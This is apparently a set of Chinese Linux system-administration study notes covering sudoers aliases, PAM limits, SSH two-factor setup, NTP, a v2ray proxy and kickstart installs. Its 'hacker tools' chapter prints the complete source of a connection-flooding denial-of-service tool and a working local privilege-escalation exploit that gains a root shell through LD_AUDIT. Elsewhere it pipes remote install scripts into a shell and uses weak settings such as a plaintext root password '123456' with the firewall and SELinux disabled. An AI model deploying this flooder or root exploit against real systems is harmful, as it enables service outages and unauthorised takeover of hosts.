[19:16:08 xiaoming@liu ~]$sudoedit /etc/sudoers

#4.sudo使用别名规则
#别名必须是大写字母和数字的组合且大写字母在前
User_Alias SYSADER=wang,mage,%admins #用户名和组结合
User_Alias DISKADER=tom
Host_Alias SERS=www.magedu.com,172.16.0.0/24 #代表的主机
Runas_Alias OP=root 
Cmnd_Alias SYDCMD=/bin/chown,/bin/chmod #授权的命令
Cmnd_Alias DSKCMD=/sbin/parted,/sbin/fdisk  #授权的命令
SYSADER SERS=   SYDCMD,DSKCMD #不同的人在指定的主机登录执行指定的命令
DISKADER ALL=(OP) DSKCMD
#别名通配符写法
User_Alias ADMINUSER = adminuser1,adminuser2
Cmnd_Alias ADMINCMD = /usr/sbin/useradd，/usr/sbin/usermod, /usr/bin/passwd [a-zA-Z]*, !/usr/bin/passwd root
ADMINUSER ALL=(root) NOPASSWD:ADMINCMD，PASSWD:/usr/sbin/userdel
```

![1651829747920](linuxSRE.assets/1651829747920.png)

**这是把root变成普通用户的操作**

![1651836274442](linuxSRE.assets/1651836274442.png)

### 28.9PAM认证机制

#### 28.9.1pam_limits.so 模块

功能：在用户级别实现对其可使用的资源的限制，例如：可打开的文件数量，可运行的进程数量，可用内存空间

![1652074370676](linuxSRE.assets/1652074370676.png)

```
1：查看现在的文件描述符大小和用户最大进程数
centos7
查看全部
# ulimit -a
查看文件描述符大小，即最大打开的文件数
# ulimit -n
查看用户最大进程数大小
# ulimit -u
Centos7修改用户进程数和文件描述符
2：文件描述符大小和用户最大进程数修改，编辑配置文件
# vim /etc/security/limits.conf
* soft nproc 65535
* hard nproc 65535
* soft nofile 65535
* hard nofile 65535
liu - maxlogins 2 #限制登录的最大次数
:wq!
保存退出
Centos7修改用户进程数和文件描述符
soft nproc： 单个用户可用的最大进程数量(软限制)
hard nproc：单个用户可用的最大进程数量(硬限制)
soft nofile： 可打开的文件描述符的最大数(软限制)
hard nofile：可打开的文件描述符的最大数(硬限制)
* ：代表所有用户，也可以写成你需要修改的用户名
3：删除/etc/security/limits.d/下的文件，否则生效的为里面文件的配置
#cd /etc/security/limits.d/，这个至关重要，不然不生效！！！！
然后一定要退出当前窗口重进下，不然也不会生效！！！！！
#rm -rf 20-nproc.conf
[18:33:16 root@liu ~]#tail /var/log/secure -f #查看日志
4.生产者常见设置参考
# End of file

*                soft    core            unlimited
*                hard    core            unlimited
*                soft    nproc           1000000
*                hard    nproc           1000000
*                soft    nofile          1000000
*                hard    nofile          1000000
*                soft    memlock         32000
*                hard    memlock         32000
*                soft    msgqueue        8192000
*                hard    msgqueue        8192000

案例：限制mage用户最大的同时登录次数

```

先要注释掉/etc/security/limits.d/20-nproc.conf的文件

![1652091834481](linuxSRE.assets/1652091834481.png)

bash超过了5次就不允许了！！

![1652091967700](linuxSRE.assets/1652091967700.png)

####  28.9.2pam_google_authenticator模块

功能：实现SSH登录的两次身份验证，先验证APP的数字码，再验证root用户的密码，都通过才可以登录。目前只支持口令验证，不支持基于key验证

官方网站：https://github.com/google/google-authenticator-android

**先手机上安装app**

![1652095808490](linuxSRE.assets/1652095808490.png)

```
#1.一键安装google_authenticator脚本
#一路y结束结束,bash执行过程中在你的linux上会出现二维码
#这时候拿你手机的app扫一下进行关联
#安装epel
#yum install -y epel-release.noarch 
#yum makecache 
#安装google authenticator
yum install -y google-authenticator.x86_64
echo -e "\033[31mDo you want me to update your "/root/.google_authenticator" file? (y/n) y"
echo -e "\033[31m你希望我更新你的“/root/.google_authenticator”文件吗(y/n)？\033[0m"
echo -e "\033[31mDo you want to disallow multiple uses of the same authentication"
echo -e "\033[31mtoken? This restricts you to one login about every 30s, but it increases"
echo -e "\033[31myour chances to notice or even prevent man-in-the-middle attacks (y/n) y"
echo -e "\033[31m你希望禁止多次使用同一个验证令牌吗?这限制你每次登录的时间大约是30秒， 但是这加大了发现或甚至防止中间人攻击的可能性(y/n)?\033[0m"
echo -e "\033[31mBy default, a new token is generated every 30 seconds by the mobile app."
echo -e "\033[31mIn order to compensate for possible time-skew between the client and the server,"
echo -e "\033[31mwe allow an extra token before and after the current time. This allows for a"
echo -e "\033[31mtime skew of up to 30 seconds between authentication server and client. If you"
echo -e "\033[31mexperience problems with poor time synchronization, you can increase the window"
echo -e "\033[31mfrom its default size of 3 permitted codes (one previous code, the current"
echo -e "\033[31mcode, the next code) to 17 permitted codes (the 8 previous codes, the current"
echo -e "\033[31mcode, and the 8 next codes). This will permit for a time skew of up to 4 minutes"
echo -e "\033[31mbetween client and server."
echo -e "\033[31mDo you want to do so? (y/n) y"
echo -e "\033[31m默认情况下，令牌保持30秒有效;为了补偿客户机与服务器之间可能存在的时滞，\033[0m"
echo -e "\033[31m我们允许在当前时间前后有一个额外令牌。如果你在时间同步方面遇到了问题， 可以增加窗口从默认的3个可通过验证码增加到17个可通过验证码，\033[0m"
echo -e "\033[31m这将允许客户机与服务器之间的时差增加到4分钟。你希望这么做吗(y/n)?\033[0m"
echo -e "\033[31mIf the computer that you are logging into isn't hardened against brute-force"
echo -e "\033[31mlogin attempts, you can enable rate-limiting for the authentication module."
echo -e "\033[31mBy default, this limits attackers to no more than 3 login attempts every 30s."
echo -e "\033[31mDo you want to enable rate-limiting? (y/n) y"
echo -e "\033[31m如果你登录的那台计算机没有经过固化，以防范运用蛮力的登录企图，可以对验证模块\033[0m"
echo -e "\033[31m启用尝试次数限制。默认情况下，这限制攻击者每30秒试图登录的次数只有3次。 你希望启用尝试次数限制吗(y/n)?\033[0m"
echo -e "\033[32m 在App Store 搜索Google Authenticator 进行App安装 \033[0m"

google-authenticator

#/etc/pam.d/sshd文件，修改或添加下行保存
#auth required pam_google_authenticator.so
sed -i '1a\auth       required     pam_google_authenticator.so' /etc/pam.d/sshd
#编辑/etc/ssh/sshd_config找到下行
#ChallengeResponseAuthentication no
#更改为
#ChallengeResponseAuthentication yes
sed -i 's/.*ChallengeResponseAuthentication.*/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config

#重启SSH服务
service sshd restart

#2.若是手机丢了 可以通过里卖弄的code找回
[19:30:40 root@liu ~]#cat .google_authenticator
82374759  #只要ssh的时候输入这个就行了，这是一次性的！
89370041
77878035
21595878
22133559 
[19:30:40 root@liu ~]#vim .google_authenticator #也可以自己随便写

#3.基于ssh key验证
[19:30:40 root@liu ~]#vim /etc/ssh/sshd_config
#在最后一行加下面内容
AuthenticationMethods publickey,keyboard-interactive
[19:30:40 root@liu ~]#vim /etc/pam.d/sshd
#注释此行
#auth  substack  password-auth
[19:30:40 root@liu ~]#systemctl restart sshd
```

![1652098613289](linuxSRE.assets/1652098613289.png)

### 28.10搭建NTP Server

![1652109113173](linuxSRE.assets/1652109113173.png)

```
#1.服务器端
#修改chrony.conf配置文件
[23:07:38 root@liu ~]#yum -y install chrony #先安装包
[23:07:38 root@liu ~]#systemctl start chronyd #启动服务
[23:07:38 root@liu ~]#timedatectl set-timezone "Asia/Shanghai"
[23:07:38 root@liu ~]#vim /etc/chrony.conf
# Use public servers from the pool.ntp.org project.
# Please consider joining the pool (http://www.pool.ntp.org/join.html).
server ntp.aliyun.com iburst #配置阿里NTP服务器
server ntp1.aliyun.com iburst
server ntp2.aliyun.com iburst

Allow NTP client access from local network.
#allow 192.168.0.0/16
allow 0.0.0.0/0 #加上这一行表示任意主机可以连接

# Serve time even if not synchronized to a time source.
#local stratum 10 #这个注释打开 表示当互联网无法连接时候，仍然可以为客户端进行时间同步
[23:24:06 root@liu ~]#systemctl restart chronyd
#验证是否同步成功
[23:27:55 root@liu ~]#chronyc sources -v
210 Number of sources = 2

  .-- Source mode  '^' = server, '=' = peer, '#' = local clock.
 / .- Source state '*' = current synced, '+' = combined , '-' = not combined,
| /   '?' = unreachable, 'x' = time may be in error, '~' = time too variable.
||                                                 .- xxxx [ yyyy ] +/- zzzz
||      Reachability register (octal) -.           |  xxxx = adjusted offset,
||      Log2(Polling interval) --.      |          |  yyyy = measured offset,
||                                \     |          |  zzzz = estimated error.
||                                 |    |           \
MS Name/IP address         Stratum Poll Reach LastRx Last sample               
===============================================================================
^* 203.107.6.88                  2   6   177    28   +335us[ +8760h] +/-   36ms
^? 120.25.115.20                 2   6   137    91   -103us[ +8760h] +/-   22ms
其中'?' = unreachable表示不成功，如果有*则表示成功

#2.客户端
#让别的服务器指向配置的NTP服务器
#拿别的机器指向当时配置NTP的机器,我用的是自己的阿里云服务器
#显然拿阿里云服务器是ping不通的，会出现no server suitable for synchronization found的错误，究极原因就是广域网是不可能ping的通局域网ip的，所以要想做实验，必须实验的两个主机是同一个网段
[root@liuwp ~]# vim /etc/chrony.conf
server 10.0.0.8 iburst #指向自己的服务器
[root@liuwp ~]# date -s '-2 year' #故意改错时间实验
[root@liuwp ~]# systemctl restart chronyd.service
[root@liuwp ~]# ntpdate 10.0.0.8 #敲这个命令进行时间同步
[root@liuwp ~]# cat /var/log/messages
```

![1652148919148](linuxSRE.assets/1652148919148.png)

## 29.黑客工具

### 29.1泛洪攻击

```
/*
 * Flood Connecter v2.1 (c) 2003-2005 by van Hauser / THC <vh@thc.org>
 * http://www.thc.org
 *
 * Connection flooder, can also send data, keep connections open etc.
 *
 * Changes:
 *		2.1 Small enhancements and bugfixes
 *		2.0 added slow send options (-w/-W), very powerful!
 *		1.4 initial public release
 *
 * Use allowed only for legal purposes.
 *
 * To compile:   cc -o flood_connect -O2 flood_connect.c
 * with openssl: cc -o flood_connect -O2 flood_connect.c -DOPENSSL -lssl
 *
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

#define PORT         80    // change this if you want
#define UNLIMITED    0     // dont change this
#define MAX_SOCKETS  65536 // change this if you want to
#define MAXFORKS     10240

#ifdef OPENSSL
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 SSL     *ssl = NULL;
 SSL_CTX *sslContext = NULL;
 RSA     *rsa = NULL;

 RSA *ssl_temp_rsa_cb(SSL *ssl, int export, int keylength) {
    if (rsa == NULL)
        rsa = RSA_generate_key(512, RSA_F4, NULL, NULL);
    return rsa;
 }
#endif

typedef struct {
    int socket;
#ifdef OPENSSL
    SSL *ssl;
#endif
    int where;
} socket_struct;

char *prg;
int   verbose = 0;
int   forks = 0;
int   pids[MAXFORKS];
int   warn = 0;
socket_struct sockets[MAX_SOCKETS];
time_t last_send = 0;
int   send_delay = 0;
int   send_amount = 0;
int   use_ssl = 0;
char *str = NULL;
int   str_len = 0;
unsigned long int count = 0, successful = 0;

void help() {
    printf("Flood Connect v2.0 (c) 2003 by van Hauser/THC <vh@thc.org> http://www.thc.org\n");
    printf("Syntax: %s [-S] [-u] [-p port] [-i file] [-n connects] [-N delay] [-c] [-C delay] [-d] [-D delay] [-w bytes] [-W delay] [-e] [-k] [-v] TARGET\n", prg);
    printf("Options:\n");
    printf("    -S           use SSL after TCP connect (not with -u, sets default port=443)\n");
    printf("    -u           use UDP protocol (default: TCP) (not usable with -c and -S)\n");
    printf("    -p port      port to connect to (default: %d)\n", PORT);
    printf("    -f forks     number of forks to additionally spawn (default: 0)\n");
    printf("    -i file      data to send to the port (default: none)\n");
    printf("    -n connects  maximum number of connects (default: unlimited)\n");
    printf("    -N delay     delay in ms between connects  (default: 0)\n");
    printf("    -c           close after connect (and sending data, if used with -i)\n");
    printf("                  use twice to shutdown SSL sessions hard (-S -c -c)\n");
    printf("    -C delay     delay in ms before closing the port (use with -c) (default: 0)\n");
    printf("    -d           dump data read from server\n");
    printf("    -D delay     delay in ms before read+dump data (-d) from server (default: 0)\n");
    printf("    -w bytes     amount of data from -i to send at one time (default: all)\n");
    printf("    -W delay     delay in seconds between sends, required by -w option\n");
    printf("    -e           stop when no more connects possible (default: retry forever)\n");
    printf("    -k           no keep-alive after finnishing with connects - terminate!\n");
    printf("    -v           verbose mode\n");
    printf("    TARGET       target to flood attack (ip or dns)\n");
    printf("Connection flooder. Nothing more to say. Use only allowed for legal purposes.\n");
    exit(-1);
}

void kill_children(int signo) {
    int i = 0;
    printf("Aborted (made %s%ld successful connects)\n", forks ? "approx. " : "", successful + successful * forks);
    while (i < forks) {
        kill(pids[i], SIGTERM);
        i++;
    }
    usleep(10000);
    i = 0;
    while (i < forks) {
        kill(pids[i], SIGKILL);
        i++;
    }
    exit(-1);
}

void killed_children(int signo) {
    int i = 0;
    if (verbose) {
      printf("Killed (made %ld successful connects)\n", successful);
    }
    exit(0);
}

void resend() {
    int i = 0, send = send_amount;
    
    if (last_send + send_delay > time(NULL))
        return;
    last_send = time(NULL);

    for (i = 0; i < MAX_SOCKETS; i++) {
        if (sockets[i].socket >= 0) {
            if (sockets[i].where < str_len) {
                if (sockets[i].where + send > str_len)
                    send = str_len - sockets[i].where;
                if (use_ssl) {
#ifdef OPENSSL
                    SSL_write(sockets[i].ssl, str + sockets[i].where, send);
#endif
                } else {
                    write(sockets[i].socket, str + sockets[i].where, send);
                }
                sockets[i].where += send;
            }
        }
    }
}

int main(int argc, char *argv[]) {
    unsigned short int  port = PORT;
    long int max_connects = UNLIMITED;
    int      close_connection = 0;
    int      exit_on_sock_error = 0;
    int      keep_alive = 1;
    int      debug = 0;
    int      dump = 0;
    long int connect_delay = 0, close_delay = 0, dump_delay = 0;
    char    *infile = NULL;
    struct   stat st;
    FILE    *f = NULL;
    int      i;
    int      s;
    int      ret;
    int      err;
    int      client = 0;
    int      reads = 0;
    int      sock_type = SOCK_STREAM;
    int      sock_protocol = IPPROTO_TCP;
    char     buf[8196];
    struct sockaddr_in target;
    struct hostent    *resolv;
    struct rlimit      rlim;
    int      pidcount = 0, res = 0;

    prg = argv[0];
    err = 0;
    memset(sockets, 0, sizeof(sockets));
    for (i = 0; i < MAX_SOCKETS; i++)
        sockets[i].socket = -1;

    if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
        help();

    while ((i = getopt(argc, argv, "cf:C:dD:N:ei:kn:p:SuvVw:W:")) >= 0) {
        switch (i) {
            case 'c': close_connection++; break;
            case 'f': forks = atoi(optarg); break;
            case 'N': connect_delay = atol(optarg); break;
            case 'C': close_delay = atol(optarg); break;
            case 'D': dump_delay = atol(optarg); break;
            case 'W': send_delay = atoi(optarg); break;
            case 'w': send_amount = atoi(optarg); break;
            case 'd': dump = 1; break;
            case 'e': exit_on_sock_error = 1; break;
            case 'u': sock_type = SOCK_DGRAM;
                      sock_protocol = IPPROTO_UDP;
                      break;
            case 'v': verbose = 1; break;
            case 'V': debug = 1; break;
            case 'i': infile = optarg; break;
            case 'k': keep_alive = 0; break;
            case 'n': max_connects = atol(optarg); break;
            case 'S': use_ssl = 1;
                      if (port == PORT)
                          port = 443;
#ifndef OPENSSL
                      fprintf(stderr, "Error: Not compiled with openssl support, use -DOPENSSL -lssl\n");
                      exit(-1);
#endif
                      break;
            case 'p': if (atoi(optarg) < 1 || atoi(optarg) > 65535) {
                          fprintf(stderr, "Error: port must be between 1 and 65535\n");
                          exit(-1);
                      }
                      port = atoi(optarg) % 65536;
                      break;
            default: fprintf(stderr,"Error: unknown option -%c\n", i); help();
        }
    }

    if (optind + 1 != argc) {
        fprintf(stderr, "Error: target missing or too many commandline options!\n");
        exit(-1);
    }
    
    if ((send_amount || send_delay) && ! (send_amount && send_delay) ) {
        fprintf(stderr, "Error: you must specify both -w and -W options together!\n");
        exit(-1);
    }

    if (close_connection && send_delay) {
        fprintf(stderr, "Error: you can not use -c and -w/-W options together!\n");
        exit(-1);
    }

    if (forks > MAXFORKS) {
        fprintf(stderr, "Error: Maximum number of pids is %d, edit code and recompile\n", MAXFORKS);
        exit(-1);
    }

    if (infile != NULL) {
        if ((f = fopen(infile, "r")) == NULL) {
            fprintf(stderr, "Error: can not find file %s\n", infile);
            exit(-1);
        }
        fstat(fileno(f), &st);
        str_len = (int) st.st_size;
        str = malloc(str_len);
        fread(str, str_len, 1, f);
        fclose(f);
    }

    if ((resolv = gethostbyname(argv[argc-1])) == NULL) {
        fprintf(stderr, "Error: can not resolve target\n");
        exit(-1);
    }
    memset(&target, 0, sizeof(target));
    memcpy(&target.sin_addr.s_addr, resolv->h_addr, 4);
    target.sin_port = htons(port);
    target.sin_family = AF_INET;

    if (connect_delay > 0)
        connect_delay = connect_delay * 1000; /* ms to microseconds */
    else
        connect_delay = 1;
    if (close_delay > 0)
        close_delay = close_delay * 1000; /* ms to microseconds */
    else
        close_delay = 1;
    if (dump_delay > 0)
        dump_delay = dump_delay * 1000; /* ms to microseconds */
    else
        dump_delay = 1;

    rlim.rlim_cur = MAXFORKS + 1;
    rlim.rlim_max = MAXFORKS + 2;
    ret = setrlimit(RLIMIT_NPROC, &rlim);
#ifndef RLIMIT_NOFILE
 #ifdef RLIMIT_OFILE
   #define RLIMIT_NOFILE RLIMIT_OFILE
 #endif
#endif
    rlim.rlim_cur = 60000;
    rlim.rlim_max = 60001;
    ret = setrlimit(RLIMIT_NOFILE, &rlim);
    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    ret = setrlimit(RLIMIT_NPROC, &rlim);
    ret = setrlimit(RLIMIT_NOFILE, &rlim);
    if (verbose) {
        if (ret == 0)
            printf("setrlimit for unlimited filedescriptors succeeded.\n");
        else
            printf("setrlimit for unlimited filedescriptors failed.\n");
    }

    for (i = 3; i < 4096; i++)
        close(i);

    printf("Starting flood connect attack on %s port %d\n", inet_ntoa((struct in_addr)target.sin_addr), port);
    (void) setvbuf(stdout, NULL, _IONBF, 0);
    if (verbose)
        printf("Writing a \".\" for every 100 connect attempts\n");

    ret = 0;
    count = 0;
    successful = 0;
    i = 1;
    s = -1;
    res = 1;

    while(pidcount < forks && res != 0) {
        res = pids[pidcount] = fork();
        pidcount++;
    }

    if (res == 0) {
        client = 1;
        signal(SIGTERM, killed_children);
    }
        
    if (res != 0) {
        if (verbose && pidcount > 0)
          printf("Spawned %d clients\n", pidcount);
        signal(SIGTERM, kill_children);
        signal(SIGINT, kill_children);
        signal(SIGSEGV, kill_children);
        signal(SIGHUP, kill_children);
    }

    if (use_ssl) {
#ifdef OPENSSL
        SSL_load_error_strings();
        SSLeay_add_ssl_algorithms();

        // context: ssl2 + ssl3 is allowed, whatever the server demands
        if ((sslContext = SSL_CTX_new(SSLv23_method())) == NULL) {
            if (verbose) {
                err = ERR_get_error();
                fprintf(stderr, "SSL: Error allocating context: %s\n", ERR_error_string(err, NULL));
            }
            res = -1;
        }

        // set the compatbility mode
        SSL_CTX_set_options(sslContext, SSL_OP_ALL);

        // we set the default verifiers and dont care for the results
        (void) SSL_CTX_set_default_verify_paths(sslContext);
        SSL_CTX_set_tmp_rsa_callback(sslContext, ssl_temp_rsa_cb);
        SSL_CTX_set_verify(sslContext, SSL_VERIFY_NONE, NULL);
#endif
    }

    while (count < max_connects || max_connects == UNLIMITED) {
        if (ret >= 0) {
            if ((s = socket(AF_INET, sock_type, sock_protocol)) < 0) {
                if (verbose && warn == 0) {
                    perror("Warning (socket)");
                    warn = 1;
                }
                if (exit_on_sock_error)
                    exit(0);
            } else {
               setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i));
            }
        }
        if (s >= 0) {
            ret = connect(s, (struct sockaddr *)&target, sizeof(target));
            if (use_ssl && ret >= 0) {
#ifdef OPENSSL
                if ((ssl = SSL_new(sslContext)) == NULL) {
                    if (verbose) {
                        err = ERR_get_error();
                        fprintf(stderr, "Error preparing an SSL context: %s\n", ERR_error_string(err, NULL));
                    }
                    ret = -1;
                } else
                    SSL_set_fd(ssl, s);
                if (ret >= 0 && SSL_connect(ssl) <= 0) {
                    printf("ERROR %d\n", SSL_connect(ssl));
                    if (verbose) {
                        err = ERR_get_error();
                        fprintf(stderr, "Could not create an SSL session: %s\n", ERR_error_string(err, NULL));
                    }
                    ret = -1;
                }

                if (debug)
                    fprintf(stderr, "SSL negotiated cipher: %s\n", SSL_get_cipher(ssl));
#endif
            }
            count++;
            if (ret >= 0) {
                successful++;
                warn = 0;
                if (str_len > 0) {
                    sockets[s].socket = s;
                    sockets[s].where = 0;
#ifdef OPENSSL
                    sockets[s].ssl = ssl;
#endif
                    if (! use_ssl)
                        if (setsockopt(s, SOL_TCP, TCP_NODELAY, &i, sizeof(i)) != 0)
                            perror("Warning (setsockopt SOL_TCP)");
                    if (send_delay > 0) {
                        resend();
                    } else {
                        if (use_ssl) {
#ifdef OPENSSL
                            SSL_write(ssl, str, str_len);
#endif
                        } else {
                            write(s, str, str_len);
                        }
                    }
                }
                if (dump) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    if (dump_delay > 0)
                        usleep(dump_delay);
                    if (use_ssl) {
#ifdef OPENSSL
                        reads = SSL_read(ssl, buf, sizeof(buf));
#endif
                    } else {
                        reads = read(s, buf, sizeof(buf));
                    }
                    if (reads > 0)
                        printf("DATA: %s\n", buf);
                    if (send_delay > 0)
                        resend();
                }
                if (close_connection) {
                    if (close_delay > 0)
                        usleep(close_delay);
#ifdef OPENSSL
                    if (use_ssl && close_connection == 1)
                        SSL_shutdown(ssl);
#endif
                    close(s);
#ifdef OPENSSL
                    if (use_ssl && close_connection > 1)
                        SSL_shutdown(ssl);
#endif
                }
                if (connect_delay > 0)
                    usleep(connect_delay);
            } else {
                if (verbose && warn == 0) {
                    perror("Warning (connect)");
                    warn = 1;
                }
                if (exit_on_sock_error)
                    exit(0);
            }
            if (verbose)
                if (count % 100 == 0)
                    printf(".");
            if (send_delay > 0)
                resend();
        } else
            close(s);
    }
    if (client) {
        while (1) {}
    } else {
        if (verbose)
            printf("\n");
        printf("Done (made %s%ld successful connects)\n", forks ? "approx. " : "", successful + successful * forks);
        if (send_delay) {
            int end = 0;
            printf("Still sending data ...\n");
            while(! end) {
                resend();
                sleep(send_delay);
                end = 1;
                for (i = 0; i < MAX_SOCKETS; i++)
                    if (sockets[i].socket >= 0 && sockets[i].where < str_len)
                        end = 0;
            }
        }
        if (keep_alive && close_connection == 0) {
            printf("Press <ENTER> to terminate connections and this program\n");
            (void) getc(stdin);
        }
    
	if (forks > 0) {
	    usleep(1 + connect_delay + dump_delay + close_delay);
            while (i < forks) {
                kill(pids[i], SIGTERM);
                i++;
            }
	    usleep(10000);
	    i = 0;
            while (i < forks) {
                kill(pids[i], SIGKILL);
                i++;
            }
        }
    }
    return 0;
}

```

### 29.2提升权限

```
mkdir /tmp/wang
ln /bin/ping /tmp/wang/test
exec 3< /tmp/wang/test
rm -rf /tmp/wang
cat > /tmp/wang.c <<eof
void __attribute__((constructor)) init()
{
    setuid(0);
    system("/bin/bash");
}
eof

gcc -w -fPIC -shared -o /tmp/wang /tmp/wang.c
LD_AUDIT="$ORIGIN" exec /proc/self/fd/3 &> /dev/null

```

## 30.v2rayN科学上网

```
Vultr注册链接：https://www.vultr.com/?ref=8753714
VPS服务器系统选择：ubuntu
服务器购买说明（翻墙打开）：https://github.com/eujc/v2ray/releases/tag/VPS
科学软件下载：https://bit.ly/2MXgZ4U
宝塔内网打开命令: /etc/init.d/bt default
---------------------------------------------------------
#0.宝塔意见安装脚本
#centos
yum install -y wget && wget -O install.sh http://download.bt.cn/install/install_6.0.sh && sh install.sh ed8484bec
#ubuntu
wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh && sudo bash install.sh ed8484bec

#宝塔一键卸载
wget http://download.bt.cn/install/bt-uninstall.sh
sh bt-uninstall.sh

#1.更新系统
apt update -y
apt install -y curl
apt install -y socat

#2.安装脚本
curl https://get.acme.sh | sh
~/.acme.sh/acme.sh --register-account -m 1805336068@qq.com

#3.放行80端口
iptables -I INPUT -p tcp --dport 80 -j ACCEPT

#4.申请证书
~/.acme.sh/acme.sh  --issue -d www.liusenbiao.com   --standalone
~/.acme.sh/acme.sh --installcert -d www.liusenbiao.com --key-file /root/private.key --fullchain-file /root/cert.crt

#5.Xray一键代码
bash <(curl -Ls https://raw.githubusercontent.com/vaxilu/x-ui/master/install.sh)
#6.放行端口
iptables -I INPUT -p tcp --dport 54321 -j ACCEPT
iptables -I INPUT -p tcp --dport 443 -j ACCEPT

#7.在浏览器上输入你的服务器的ip+Xray的设置的端口号
#进入控制面板
```

![1651807198193](linuxSRE.assets/1651807198193.png)

![1651807483887](linuxSRE.assets/1651807483887.png)

![1651807589357](linuxSRE.assets/1651807589357.png)

![1651807619246](linuxSRE.assets/1651807619246.png)

## 31.自动化运维

### 31.1系统部署

#### 31.1.1安装kickstart文件(半自动化)

```
#1.安装kickstart相对应的包
[17:45:17 root@liu ~]#yum -y install system-config-kickstart
#10.0.0.1是你的windows的VMnet8的ipv4地址
#0.0是你的Xmanager-Passive的地址
[18:22:46 root@liu ~]#export DISPLAY=10.0.0.1:0.0
#这个时候你的Xshell会弹出一个对话框
[18:23:23 root@liu ~]#system-config-kickstart

#2.搭建Yum仓库
[18:38:23 root@liu ~]#mkdir /var/www/html/centos/{7,8}/os/x86_64 -pv
[18:41:47 root@liu ~]#mount /dev/sr0 /var/www/html/centos/8/os/x86_64/
```

**这个是kickstart可视化界面**

![1652179653633](linuxSRE.assets/1652179653633.png)

**搭建私有Yum仓库**

![1652179811670](linuxSRE.assets/1652179811670.png)

![1652185445196](linuxSRE.assets/1652185445196.png)

**创建分区信息**

![1652185660534](linuxSRE.assets/1652185660534.png)

**网卡添加**

![1652185765827](linuxSRE.assets/1652185765827.png)

**禁用防火墙**

![1652185841256](linuxSRE.assets/1652185841256.png)

**保存家目录**

**是因为Package Selection没出来，所以要先保存在手动配置**

![1652185924134](linuxSRE.assets/1652185924134.png)

```
[20:32:30 root@liu ~]#vim /etc/yum.repos.d/base.repo
```

![1652186216197](linuxSRE.assets/1652186216197.png)

**选择你需要安装的包**

![1652186894994](linuxSRE.assets/1652186894994.png)

```
这些东西都配置完成以后，保存到根目录，然后退出开始编写安装后脚本
[20:47:22 root@liu ~]#vim ks7.cfg
#下面写的是安装以后自动完成的脚本
#分别是搭建epel源和创建linux44账号
#centos7的应答文件
#只能创建centos7的虚拟机才能成功安装
#platform=x86, AMD64, or Intel EM64T
#version=DEVEL
# Install OS instead of upgrade
install
# Keyboard layouts
keyboard 'us'
# Root password
rootpw --iscrypted $1$PzisIaYn$YwYiXKZxnHO5V0RYvli.A/
# System language
lang en_US
# System authorization information
auth  --useshadow  --passalgo=sha512
# Use text mode install
text
firstboot --disable
# SELinux configuration
selinux --disabled


# Firewall configuration
firewall --disabled
# Network information
network  --bootproto=dhcp --device=eth0
# Reboot after installation
reboot
# System timezone
timezone Africa/Abidjan
# Use network installation
url --url="http://10.0.0.7/centos/7/os/x86_64/"
# System bootloader configuration
bootloader --append="net.ifnames=0" --location=mbr
# Clear the Master Boot Record
zerombr
# Partition clearing information
clearpart --all --initlabel
# Disk partitioning information
part /boot --fstype="xfs" --ondisk=sda --size=1024
part swap --fstype="swap" --ondisk=sda --size=4096
part / --fstype="xfs" --ondisk=sda --size=102400
part /data --fstype="xfs" --ondisk=sda --size=51200

%post
mkdir /etc/yum.repos.d/bak
mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/bak
cat > /etc/yum.repos.d/base.repo <<EOF
[base]
name=CentOS
baseurl=file:///misc/cd
        https://mirrors.aliyun.com/centos/$releasever/os/$basearch/
        https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/
        https://mirrors.huaweicloud.com/centos/$releasever/os/x86_64/os/
        https://mirrors.cloud.tencent.com/centos/$releasever/os/$basearch/
gpgcheck=0

[extras]
name=extras
baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch
        https://mirrors.huaweicloud.com/centos/$releasever/extras/$basearch
        https://mirrors.cloud.tencent.com/centos/$releasever/extras/$basearch
        https://mirrors.aliyun.com/centos/$releasever/extras/$basearch
gpgcheck=0
enabled=1

[epel]
name=epel
baseurl=http://mirrors.cloud.tencent.com/epel/$releasever/$basearch
        http://mirrors.huaweicloud.com/epel/$releasever/$basearch
gpgcheck=1
gpgkey=http://mirrors.huaweicloud.com/epel/RPM-GPG-KEY-EPEL-7

EOF

%end


#centos8的应答文件
#只能创建centos7的虚拟机才能成功安装
#version=RHEL8
# Use graphical install
text
reboot
selinux --disabled
firewall --disabled
url --url="http://10.0.0.7/centos/8/os/x86_64"
%packages
@^minimal-environment
kexec-tools

%end

# Keyboard layouts
keyboard --xlayouts='us'
# System language
lang en_US.UTF-8

# Network information
bootloader --append="net.ifnames=0 --location=mbr"
network  --bootproto=dhcp --device=eth0 --ipv6=auto --activate
network  --hostname=centos8.liusenbiao.org

# Use CDROM installation media

# Run the Setup Agent on first boot
firstboot --enable

zerombr
clearpart --all --initlabel
ignoredisk --only-use=sda
# Partition clearing information
# Disk partitioning information
part /boot --fstype="xfs" --ondisk=sda --size=1024
part swap --fstype="swap" --ondisk=sda --size=4096
part / --fstype="xfs" --ondisk=sda --size=102400
part /data --fstype="xfs" --ondisk=sda --size=51200
# System timezone
timezone Asia/Shanghai --isUtc --nontp

# Root password
rootpw --plaintext 123456

%addon com_redhat_kdump --enable --reserve-mb='auto'

%end

%anaconda
pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty
pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok
pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty
%end

#centos8的应答文件二：
#只能创建centos7的虚拟机才能成功安装
#version=RHEL8
# Use graphical install
ignoredisk --only-use=sda
zerombr
text
reboot
clearpart --all --initlabel
selinux --disabled
firewall --disabled
url --url="http://10.0.0.7/centos/8/os/x86_64"
keyboard --vckeymap=us --xlayouts='us'
